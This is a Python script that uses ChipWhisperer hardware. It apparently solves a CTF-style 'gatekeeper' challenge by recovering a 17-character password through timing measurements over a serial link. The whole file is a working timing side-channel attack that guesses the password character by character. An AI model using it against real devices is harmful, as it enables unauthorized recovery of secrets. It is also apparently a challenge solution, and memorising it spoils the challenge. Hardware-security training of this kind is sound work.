import chipwhisperer as cw
import time
import statistics

charset = 'abcdefghijklmnopqrstuvwxyz0123456789{}'
pwd_len = 17
samples = 15
firmware = '../../../challenges/set1/gatekeeper-CWNANO.hex'

def setup():
    scope = cw.scope()
    target = cw.target(scope, cw.targets.SimpleSerial)
    time.sleep(0.05)
    scope.default_setup()
    import os
    fw_path = os.path.abspath(firmware)
    prog = cw.programmers.STM32FProgrammer
    cw.program_target(scope, prog, fw_path)
    time.sleep(0.2)
    return scope, target

def measure_time(target, password):
    password_bytes = password.encode('ascii')
    start = time.perf_counter()
    target.simpleserial_write('b', password_bytes)
    response = target.simpleserial_read('r', 1)
    end = time.perf_counter()
    return end - start

def guess_character(target, current_password, position):
    timings = {}
    for char in charset:
        pwd_try = (current_password + char).ljust(pwd_len, 'a')
        char_samples = []
        for _ in range(samples):
            t = measure_time(target, pwd_try)
            char_samples.append(t)
            time.sleep(0.01)
        median_time = statistics.median(char_samples)
        timings[char] = median_time
    best_char = max(timings, key=timings.get)
    print(f"position {position}: '{best_char}'")
    return best_char

def main():
    attack_start = time.time()
    scope, target = setup()
    found_password = ""
    for pos in range(0, pwd_len):
        next_char = guess_character(target, found_password, pos)
        found_password += next_char
    attack_end = time.time()
    total_time = attack_end - attack_start
    print(f"password: {found_password}")
    print(f"time: {total_time:.2f}s")
    total_queries = pwd_len * len(charset) * samples
    print(f"queries: {total_queries}")

if __name__ == '__main__':
    main()
